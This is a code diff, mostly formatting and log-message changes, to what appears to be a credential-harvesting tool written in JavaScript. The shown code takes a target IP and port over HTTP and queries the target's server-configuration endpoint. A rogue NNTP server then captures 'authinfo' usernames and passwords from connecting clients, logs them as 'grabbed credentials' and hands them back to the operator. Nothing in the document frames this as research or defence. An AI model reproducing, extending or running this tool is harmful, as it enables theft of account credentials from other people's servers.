@@ -72,9 +72,7 @@ httpServer.get("/:target", async (request) => {
 	credentials[target.split(":")[0]] = [];
 	if (!target.match(/[0-9]+(?:\.[0-9]+){3}:[0-9]+/)?.length) {
 		console.log(
-			chalk.red.bold(
-				`  │ [http] invalid ip address passed. (${target})`,
-			),
+			chalk.red.bold(`  │ [http] invalid ip address passed. (${target})`),
 		);
 		return {
 			error: true,
@@ -82,17 +80,13 @@ httpServer.get("/:target", async (request) => {
 				message: "Invalid IP Address",
 			},
 		};
-	};
+	}
 	const baseUrl = `http://${target}`;
 
 	console.log(chalk.green(`+ [http] (${target}) new target`));
 	const [error, body] = await bRequest(`${baseUrl}/config/server/`);
 	if (error) {
-		console.log(
-			chalk.red.bold(
-				`  │ [http] (${target}) error. (${error})`,
-			),
-		);
+		console.log(chalk.red.bold(`  │ [http] (${target}) error. (${error})`));
 		return {
 			error: true,
 			data: {
@@ -215,7 +209,7 @@ httpServer.get("/:target", async (request) => {
 
 	return {
 		error: false,
-		data: credentials[target.split(":")[0]].filter(cred => cred.password),
+		data: credentials[target.split(":")[0]].filter((cred) => cred.password),
 	};
 });
 // #endregion
@@ -224,11 +218,11 @@ httpServer.get("/:target", async (request) => {
 nntpServer.on("connection", (socket) => {
 	console.log(
 		chalk.blue(
-			`  │    [nntp] (${socket.remoteAddress}) new connection established`,
+			`  │   [nntp] (${socket.remoteAddress}) new connection established`,
 		),
 	);
 	const timeout = setTimeout(() => {
-		chalk.red.bold("  │     timeout.");
+		chalk.red.bold("  │ timeout.");
 		socket.destroy();
 	}, 10000);
 	let credentialKey = "";
@@ -236,7 +230,11 @@ nntpServer.on("connection", (socket) => {
 	socket.on("data", (data) => {
 		const stringifiedData = data.toString();
 		if (!stringifiedData.trim().startsWith("authinfo")) {
-			console.error(chalk.red.bold("  │     did not send right response."));
+			console.error(
+				chalk.red.bold(
+					`  │   [nntp] (${socket.remoteAddress}) did not send right response.`,
+				),
+			);
 			socket.destroy();
 		}
 		const key = stringifiedData.trim().split(" ")[1];
@@ -261,10 +259,16 @@ nntpServer.on("connection", (socket) => {
 			].password = value.trim();
 			clearTimeout(timeout);
 			socket.destroy();
-			console.log(chalk.blue.bold(`  │      [nntp] (${socket.remoteAddress}) grabbed credentials:`));
+			console.log(
+				chalk.blue.bold(
+					`  │     [nntp] (${socket.remoteAddress}) grabbed credentials for (${credentials[credentialKey][
+						credentials[credentialKey].length - 1
+					].server}):`,
+				),
+			);
 			console.log(
 				chalk.blue(
-					`  │        [nntp] (${socket.remoteAddress}) username: ${
+					`  │     [nntp] username: ${
 						credentials[credentialKey][credentials[credentialKey].length - 1]
 							.username
 					}`,
@@ -272,7 +276,7 @@ nntpServer.on("connection", (socket) => {
 			);
 			console.log(
 				chalk.blue(
-					`  │        [nntp] (${socket.remoteAddress}) password: ${
+					`  │     [nntp] password: ${
 						credentials[credentialKey][credentials[credentialKey].length - 1]
 							.password
 					}`,
@@ -297,13 +301,17 @@ const start = async () => {
 			},
 			() => {
 				console.log(
-					`HTTP server listening on ${config.http.host}:${config.http.port}`,
+					chalk.greenBright(
+						`HTTP server listening on ${config.http.host}:${config.http.port}`,
+					),
 				);
 			},
 		);
 		nntpServer.listen(config.nntp.port, config.nntp.host, () => {
 			console.log(
-				`NNTP server listening on ${config.nntp.host}:${config.nntp.port}`,
+				chalk.greenBright(
+					`NNTP server listening on ${config.nntp.host}:${config.nntp.port}`,
+				),
 			);
 		});
 	} catch (err) {
